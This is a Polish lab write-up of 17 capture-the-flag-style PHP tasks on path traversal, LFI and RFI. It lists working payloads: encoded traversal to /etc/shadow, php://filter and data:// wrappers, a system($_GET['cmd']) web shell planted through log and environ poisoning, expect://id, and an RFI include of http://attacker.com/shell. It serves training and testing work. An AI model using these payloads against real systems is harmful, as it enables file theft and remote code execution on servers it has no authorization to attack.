---
id: ptsd-lab-path-traversal-lfi-rfi-writeup
title: "PTSD Lab - Path Traversal, LFI/RFI i PHP wrappers w praktyce"
team: red
domain: labs-writeups
section: ptsd
topic: path-traversal-lfi-rfi
type: writeup
angle: file-inclusion-and-traversal-lab-workflow
sourceTrack: sah-0-to-1
tags: ["path-traversal", "lfi", "rfi", "php", "php-wrappers", "php-filters", "waf-bypass"]
difficulty: mixed
shortDescription: "Techniczny write-up z 17 zadań PTSD Lab poświęconych Path Traversal, LFI i RFI, prowadzony w praktycznym formacie rozpoznawania obserwacji, budowania hipotezy i wykonywania kolejnego kroku, z naciskiem na mechanikę błędu, dobór bypassów, użycie PHP wrappers i PHP filters oraz przechodzenie od prostego odczytu plików do bardziej niebezpiecznych scenariuszy."
updatedAt: "2026-03-03"
---

# PTSD Lab - Path Traversal + LFI/RFI (17 zadań)

## Kompas (zanim zaczniesz klikać)

- `readfile()` / `file_get_contents()` → zwykle **czytanie** (Path Traversal / LFI-read).
- `include()` / `require()` → **dołączenie i interpretacja** (LFI/RFI, często eskalacja do RCE).
- “WAF blokuje `../`” → myśl: **normalizacja / dekodowanie / różne warstwy**.
- Windows → myśl: **backslash** i czasem wildcardy.

---

# 01) Reading index.php via basic traversal (EASY - 100)

![Zadanie 01 - screenshot](/field-manual/assets/ptsd_path_traversal/01.png)

### Co widzę

Kod skleja prefiks z moim parametrem i czyta plik:

```php
$file = $_GET['image'];
echo file_get_contents('/var/www/html/files/' . $file);
```

### Co myślę

„To jest klasyczny **path traversal**. Testuję `../`.”

### Co klikam / co wpisuję

- `../index.php`

### Co obserwuję

- Zmiana odpowiedzi: treść pliku albo błąd “no such file”.

### Dlaczego to działa

OS normalizuje: `files/../index.php` → `index.php`.

### Co warto spróbować, gdyby nie siadło

- `../../index.php`
- `%2e%2e%2findex.php`

### Typowe potknięcie

Założenie, że sam prefiks “izoluje”. Bez normalizacji i walidacji - nie.

### Black-box (bez źródeł) - jak bym to rozpoznał i poprowadził

- Szukam parametrów typu `file`, `img`, `download`, `path`, `page`.
- Wrzucam kontrolkę: `test.txt` vs `doesnotexist` → patrzę na różnicę w błędach.
- Potem `../` → sprawdzam, czy zmienia się ścieżka w komunikacie albo status.
- Dopiero potem znany target: `../../../etc/passwd` lub `..\..\Windows\win.ini`.

---

# 02) Read /etc/passwd - null byte suffix bypass (EASY - 150)

![Zadanie 02 - screenshot](/field-manual/assets/ptsd_path_traversal/02.png)

### Co widzę

Suffix `.php` doklejany do `include()`:

```php
$page = $_GET['file'];
include($page . '.php');
```

### Co myślę

„Doklejany suffix psuje trafienie. Historycznie próbuję **null byte**.”

### Co klikam / co wpisuję

- `../../../etc/passwd`
- `../../../etc/passwd%00`

### Co obserwuję

- W labach legacy `%00` może zadziałać.

### Dlaczego to działa

W starych PHP null byte mógł uciąć string przed suffixem.

### Co warto spróbować

- Jeśli `%00` nie działa: traktuję jako lekcję “dlaczego kiedyś to działało”, a w realu szukam innych bypassów.

### Typowe potknięcie

Zakładanie, że `%00` jest uniwersalne. To raczej archeologia.

### Black-box

- Po `../../../etc/passwd` patrzę na błąd: czy w komunikacie widać dopięte `.php`?
- Jeśli tak: sprawdzam, czy aplikacja w ogóle jest PHP i czy błąd sugeruje starszy stack.
- Realnie zamiast null byte częściej idę w: `php://filter` (jeśli include), albo w inne endpointy bez suffixa.

---

# 03) PHP Filter: source code disclosure via base64 (MEDIUM - 250)

![Zadanie 03 - screenshot](/field-manual/assets/ptsd_path_traversal/03.png)

### Co widzę

```php
$page = $_GET['page'];
include($page);
```

### Co myślę

„`include()` = wykonanie. Ja chcę **source** → `php://filter`.”

### Co klikam / co wpisuję

- `php://filter/convert.base64-encode/resource=config.php`

### Co obserwuję

- Base64 w odpowiedzi → dekoduję → mam kod.

### Dlaczego to działa

Filter zwraca tekst (base64), nie “żywe” PHP.

### Co warto spróbować

- `resource=/var/www/html/config.php` (gdy relative nie działa)

### Typowe potknięcie

Test `?page=config.php` i zdziwienie, że nic nie “wyświetla”.

### Black-box

- Rozpoznaję include po symptomach: błędy typu “failed to open stream”, “include():”.
- Jeśli to include: od razu testuję `php://filter/.../resource=index.php`.
- Jeśli dostanę base64, to wiem, że mam disclosure bez RCE.

---

# 04) PHP Filter chain - obejście blokady “base64” (MEDIUM - 300)

![Zadanie 04 - screenshot](/field-manual/assets/ptsd_path_traversal/04.png)

### Co widzę

Blokada na string `base64`, ale nadal include.

### Co myślę

„To blacklist. Omijam innym filtrem / chainem.”

### Co klikam / co wpisuję

- `php://filter/read=string.rot13/resource=secret.php`
- `php://filter/convert.iconv.UTF-8.UTF-16/resource=secret.php`
- `php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.iconv.UTF-8.UTF-7/resource=secret.php`

### Co obserwuję

- “Zniekształcony” output → odwracam transformację.

### Dlaczego to działa

WAF blokuje słowo, nie mechanikę wrapperów.

### Typowe potknięcie

Uparte trzymanie się base64 zamiast myślenia “dowolna transformacja = disclosure”.

### Black-box

- Jeśli request z `php://filter/...base64...` jest blokowany 403/“forbidden” → próbuję inny filtr bez “base64”.
- Patrzę, czy blokada zależy od RAW czy po decode.
- Często rot13 przechodzi tam, gdzie base64 jest blokowane “na pałę”.

---

# 05) WAF bypass - URL-encoded traversal (MEDIUM - 300)

![Zadanie 05 - screenshot](/field-manual/assets/ptsd_path_traversal/05.png)

### Co widzę

WAF blokuje `../`, backend robi `readfile('/base/' . $file)`.

### Co myślę

„Filtr patrzy na RAW. Koduję.”

### Co klikam / co wpisuję

- `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow`

### Co obserwuję

- Przechodzi tam, gdzie `../../../etc/shadow` było blokowane.

### Dlaczego to działa

Backend widzi już zdekodowane `../`.

### Typowe potknięcie

Kodowanie tylko części sekwencji.

### Black-box

- Najpierw sprawdzam, czy blokada jest regexem na `../` (403) czy “soft” (sanityzuje na backendzie).
- Jeśli 403: testuję `%2e%2e%2f` oraz `%2e%2e/`.
- Jeśli backend “czyści”: testuję double-encode (#06).

---

# 06) Double URL encoding - mismatch proxy/backend (HARD - 400)

![Zadanie 06 - screenshot](/field-manual/assets/ptsd_path_traversal/06.png)

### Co widzę

Backend robi `urldecode()` sam:

```php
$file = urldecode($_GET['doc']);
readfile('/docs/' . $file);
```

### Co myślę

„Są **dwa dekodowania**. Daję `%25`.”

### Co klikam / co wpisuję

- `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`

### Co obserwuję

- Działa mimo filtrów na warstwie front.

### Dlaczego to działa

Po 1 decode zostaje `%2e%2e%2f`, po 2 decode powstaje `../`.

### Typowe potknięcie

Zapomnienie o `%25`.

### Black-box

- Jeśli widzę proxy/CDN/WAF przed backendem i wyniki zależą od “jak koduję”, to od razu testuję double-encode.
- Sprawdzam różne warianty: `%252f`, `%255c` (Windows).

---

# 07) Null byte injection - truncate appended .html (MEDIUM - 250)

![Zadanie 07 - screenshot](/field-manual/assets/ptsd_path_traversal/07.png)

### Co widzę

`include('/templates/' . $tpl . '.html')`

### Co myślę

„Suffix. Historycznie null byte.”

### Co klikam / co wpisuję

- `../../../etc/passwd%00`

### Dlaczego to działa

Legacy null byte truncation.

### Typowe potknięcie

Oczekiwanie sukcesu na nowoczesnym stacku.

### Black-box

- Jeśli błąd pokazuje finalną ścieżkę z `.html`, wiem, że suffix jest doklejany.
- W realu zamiast `%00` częściej próbuję: `....//`, encoding, albo szukam endpointu bez suffixa.

---

# 08) Bypass blacklist '../' using ....// (MEDIUM - 300)

![Zadanie 08 - screenshot](/field-manual/assets/ptsd_path_traversal/08.png)

### Co widzę

Regex blacklist na `../` (i to dość “customowy”).

### Co myślę

„Blacklist = do obejścia. Szukam formy, której regex nie rozpozna, a system znormalizuje.”

### Co klikam / co wpisuję

- `....//....//....//etc/hostname`

### Dlaczego to działa

Regex ≠ normalizacja. Omijasz dopasowanie, a potem ścieżka jest rozwiązywana.

### Typowe potknięcie

Brak testów kontrolnych i zbyt szybkie skakanie na “dziwne bypassy”.

### Black-box

- Jeśli widzę “Forbidden” na `../`, testuję: `%2e%2e%2f`, double-encode, `....//`, mieszane separatory.
- Patrzę, czy blokada jest tylko na string, czy jest realpath/whitelist.

---

# 09) Remote File Inclusion (RFI) + bypass suffix (HARD - 450)

![Zadanie 09 - screenshot](/field-manual/assets/ptsd_path_traversal/09.png)

### Co widzę

`include($module . '.php')` i warunek RFI.

### Co myślę

„Suffix psuje URL. Używam `?` albo `#`.”

### Co klikam / co wpisuję

- `http://attacker.com/shell?`

### Dlaczego to działa

Doklejone `.php` trafia do query string.

### Typowe potknięcie

Brak zrozumienia, że w realu `allow_url_include` prawie zawsze OFF.

### Black-box

- Rozpoznaję RFI po tym, że aplikacja próbuje fetchować URL (opóźnienie, DNS, requesty wychodzące).
- Testuję “canary” URL, np. domenę kontrolowaną (w labie: wskaźnik “fetched”).
- Jeśli jest suffix: `?` / `#`.

---

# 10) data:// wrapper - kod PHP w URL (HARD - 450)

![Zadanie 10 - screenshot](/field-manual/assets/ptsd_path_traversal/10.png)

### Co widzę

Include na parametrze, a lab dopuszcza streamy.

### Co myślę

„Skoro mogę include stream, to `data://` daje mi payload bez hostowania.”

### Co klikam / co wpisuję

- `data://text/plain,<?php phpinfo(); ?>`
- `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`

### Dlaczego to działa

`include()` interpretuje zawartość wrappera jako PHP.

### Typowe potknięcie

Błędna składnia `data://`.

### Black-box

- Jeśli `http://` nie działa (RFI off), ale include jest na parametrze → próbuję lokalne wrappery (`php://filter`, `data://`, `php://input`) zależnie od polityk.
- Patrzę na błędy: “wrapper is disabled” to też informacja.

---

# 11) php://input - wrapper jako wartość parametru (HARD - 400)

![Zadanie 11 - screenshot](/field-manual/assets/ptsd_path_traversal/11.png)

### Co widzę

Hint: **"Just type: php://input"**. Pole UI to wartość parametru.

### Co myślę

„Lab testuje rozpoznanie wrappera. Wpisuję samo `php://input`.”

### Co klikam / co wpisuję

- `php://input`

### Dlaczego to działa

`php://input` zwraca raw body requestu jako stream.

### Real-world notes

- Parametr: `file=php://input`
- Body POST: `<?php system('id'); ?>`

### Typowe potknięcie

Mieszanie parametru z body i kodem w jednym polu.

### Black-box

- Jeśli mam możliwość wysyłania POST i widzę include na `file=`: testuję `php://input`.
- Patrzę, czy aplikacja przyjmuje raw body (nie multipart).
- Gdy działa: w kolejnym kroku sprawdzam, czy mogę sterować body i czy to jest RCE czy tylko błędy.

---

# 12) Windows traversal - backslash bypass (MEDIUM - 300)

![Zadanie 12 - screenshot](/field-manual/assets/ptsd_path_traversal/12.png)

### Co widzę

Windows path w kodzie.

### Co myślę

„Jeśli `../` blokowane, `..\` często przechodzi.”

### Co klikam / co wpisuję

- `..\..\..\Windows\System32\drivers\etc\hosts`
- `..%5c..%5c..%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts`

### Dlaczego to działa

`\` to separator na Windows.

### Typowe potknięcie

Używanie `\` na Linuxie.

### Black-box

- Rozpoznaję Windows po błędach (ścieżki `C:\...`) albo bannerach.
- Testuję win targets: `..\..\Windows\win.ini` lub `System32\drivers\etc\hosts`.
- Mieszam separatory i encoding zależnie od filtrów.

---

# 13) LFI + Log Poisoning - Apache access.log (HARD - 500)

![Zadanie 13 - screenshot](/field-manual/assets/ptsd_path_traversal/13.png)

### Co widzę

`include($view)`.

### Co myślę

„Nie mam uploadu? To szukam pliku z pośrednim zapisem: log.”

### Co robię

1. Poison UA: `<?php system($_GET["cmd"]); ?>`
2. LFI do loga: `../../../var/log/apache2/access.log`
3. `&cmd=id`

### Dlaczego to działa

Log zawiera PHP i `include()` go wykona.

### Typowe potknięcie

Brak poison przed include.

### Black-box

- Jeśli include działa, a nie mam bezpośredniego uploadu: szukam log locations, session files, temp files.
- Najpierw sprawdzam, czy mogę wstrzyknąć kontrolowany string w log (UA/Referer).
- Potem próbuję LFI na typowych ścieżkach logów i obserwuję, czy “mój string” się pojawia.

---

# 14) LFI via /proc/self/environ - CGI poisoning (HARD - 500)

![Zadanie 14 - screenshot](/field-manual/assets/ptsd_path_traversal/14.png)

### Co widzę

LFI + kontekst CGI/procfs.

### Co myślę

„Nagłówki → env var → `/proc/self/environ`.”

### Co robię

1. Poison UA: `<?php system($_GET["cmd"]); ?>`
2. LFI: `../../../proc/self/environ`
3. `&cmd=id`

### Dlaczego to działa

W CGI nagłówki mapują się do env i są dostępne przez procfs.

### Typowe potknięcie

Zakładanie, że to działa na każdym setupie PHP.

### Black-box

- Sprawdzam, czy serwer wygląda na Linux + CGI/FastCGI.
- Wstrzykuję marker w nagłówek (nie od razu PHP), np. `AAAA`.
- LFI do `/proc/self/environ` i sprawdzam, czy marker jest widoczny → dopiero potem próbuję PHP.

---

# 15) Path truncation - padding TYLKO /./ (HARD - 500)

![Zadanie 15 - screenshot](/field-manual/assets/ptsd_path_traversal/15.png)

### Co widzę

Opis o truncation i limitach długości ścieżki.

### Co myślę

„Neutralny padding, który nie zmienia ścieżki: `/./`.”

### Co klikam / co wpisuję

- `../../../etc/passwd/./././././././././././././././././././././././././././././././`

### Dlaczego to działa

`/./` zwiększa długość, ale po normalizacji dalej wskazuje ten sam plik.

### Typowe potknięcie

Dopisywanie `...` zamiast `/./`.

### Black-box

- Jeśli widzę doklejany suffix, a klasyczne bypassy nie działają, rozważam “edge case” typu truncation.
- Używam neutralnych segmentów (`/./`) i obserwuję, czy błąd zmienia się (np. suffix nagle znika w logu/błędzie).
- W realu trzeba by często dojść do dużych długości, ale w labie liczy się koncept.

---

# 16) expect:// wrapper - command execution (HARD - 500)

![Zadanie 16 - screenshot](/field-manual/assets/ptsd_path_traversal/16.png)

### Co widzę

Wzmianka o wrapperze `expect`.

### Co myślę

„Jak wrapper jest, to jest proste: `expect://cmd`.”

### Co klikam / co wpisuję

- `expect://id`

### Dlaczego to działa

Wrapper uruchamia komendę i zwraca output jako stream.

### Typowe potknięcie

Próba na środowisku bez extension.

### Black-box

- Szukam leaków o extensionach (phpinfo, błędy, stack traces).
- Jeśli widzę info o `expect`, testuję minimalną komendę typu `id`.
- Jeśli brak sygnałów - nie tracę czasu, bo to rzadkie.

---

# 17) Windows FindFirstFile wildcard - < dla nieznanego rozszerzenia (HARD - 500)

![Zadanie 17 - screenshot](/field-manual/assets/ptsd_path_traversal/17.png)

### Co widzę

Windows + include + suffix `.php`.

### Co myślę

„Chcę `db_config.*` bez znajomości ext. Legacy wildcardy.”

### Co klikam / co wpisuję

- `..\private\db_config<`

### Dlaczego to działa

W Win32 API `<` bywa interpretowany jako wildcard dla dopasowania rozszerzeń.

### Typowe potknięcie

Testowanie poza Windows albo w środowisku, które nie używa takiego path resolution.

### Black-box

- Najpierw potwierdzam Windows (błędy z `C:\`, nagłówki serwera).
- Jeśli widzę doklejany suffix i nie znam rozszerzenia pliku: testuję techniki wildcardów specyficzne dla Windows.
- Patrzę, czy zachowanie jest spójne (czy zwraca “pierwszy match” / zmienia się plik po zmianie prefiksu).

---

## Najważniejsze wnioski po labie

1. Rozpoznanie mechaniki (read vs include) jest ważniejsze niż payloady.
2. WAF bypassy zwykle sprowadzają się do różnic w normalizacji między warstwami.
3. LFI robi się groźne, kiedy masz plik z pośrednim zapisem (log/environ/input).
4. W labach symulowanych UI często reprezentuje tylko wartość parametru - hint mówi, jaką warstwę testujesz.
